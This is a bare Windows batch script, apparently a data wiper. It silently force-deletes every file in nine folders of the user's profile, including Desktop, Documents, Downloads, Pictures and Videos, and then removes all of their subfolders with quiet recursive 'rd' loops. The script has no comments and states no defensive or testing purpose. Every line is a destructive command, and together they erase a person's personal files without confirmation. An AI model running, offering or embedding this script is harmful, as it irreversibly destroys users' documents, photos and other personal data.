del "%userprofile%\Contacts" /q /f /s
del "%userprofile%\Desktop" /q /f /s
del "%userprofile%\documents" /q /f /s
del "%userprofile%\downloads" /q /f /s
del "%userprofile%\Music" /q /f /s
del "%userprofile%\Pictures" /q /f /s
del "%userprofile%\Saved Games" /q /f /s
del "%userprofile%\Searches" /q /f /s
del "%userprofile%\Videos" /q /f /s
for /d %%p in ("%userprofile%\Contacts\*") do rd "%%p" /s /q
for /d %%p in ("%userprofile%\Desktop\*") do rd "%%p" /s /q
for /d %%p in ("%userprofile%\documents\*") do rd "%%p" /s /q
for /d %%p in ("%userprofile%\downloads\*") do rd "%%p" /s /q
for /d %%p in ("%userprofile%\Music\*") do rd "%%p" /s /q
for /d %%p in ("%userprofile%\Pictures\*") do rd "%%p" /s /q
for /d %%p in ("%userprofile%\Saved Games\*") do rd "%%p" /s /q
for /d %%p in ("%userprofile%\Searches\*") do rd "%%p" /s /q
for /d %%p in ("%userprofile%\Videos\*") do rd "%%p" /s /q
